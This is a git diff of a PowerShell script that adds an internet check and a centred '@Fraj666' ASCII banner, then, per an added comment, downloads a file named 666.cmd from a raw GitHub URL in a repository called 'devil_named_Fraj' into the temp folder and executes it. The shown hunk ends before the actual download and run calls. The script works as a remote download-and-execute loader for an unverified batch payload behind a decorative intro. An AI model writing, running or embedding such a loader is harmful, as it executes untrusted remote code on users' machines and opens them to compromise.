@@ -1,6 +1,23 @@
 Clear-Host
 
-$topBone = "   (o)=======================================================(o)   "
+# 1. Check internet connection first (pings GitHub / Cloudflare DNS quietly)
+$isConnected = (Test-Connection -ComputerName "1.1.1.1" -Count 1 -Quiet) -or (Test-Connection -ComputerName "raw.githubusercontent.com" -Count 1 -Quiet)
+
+if (-not $isConnected) {
+    $errMsg = "   [!] MUST BE CONNECTED TO THE INTERNET : @Fraj   "
+    $winWidth = $Host.UI.RawUI.WindowSize.Width
+    $padSize = [Math]::Max(0, [Math]::Floor(($winWidth - $errMsg.Length) / 2))
+    $pad = " " * $padSize
+
+    Write-Host "`n`n"
+    Write-Host $pad -NoNewline
+    Write-Host $errMsg -ForegroundColor White -BackgroundColor DarkRed
+    Write-Host "`n"
+    return
+}
+
+# 2. Connected -> Show centered @Fraj666 intro banner
+$topBone  = "   (o)=======================================================(o)   "
 $botSnake = "   ~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~<:===  "
 
 $banner = @(
@@ -14,7 +31,6 @@ $banner = @(
     "                              |__/                     "
 )
 
-# Calculate center padding based on current PowerShell window width
 $winWidth = $Host.UI.RawUI.WindowSize.Width
 $boxWidth = $banner[0].Length
 $padSize = [Math]::Max(0, [Math]::Floor(($winWidth - $boxWidth) / 2))
@@ -33,6 +49,7 @@ Write-Host ""
 Write-Host ($pad + $botSnake) -ForegroundColor Green
 Write-Host ""
 
+# 3. Download and execute 666.cmd
 $url = "https://raw.githubusercontent.com/lenonschizophrenic-crypto/devil_named_Fraj/main/666.cmd"
 $tempFile = "$env:TEMP\666.cmd"
 
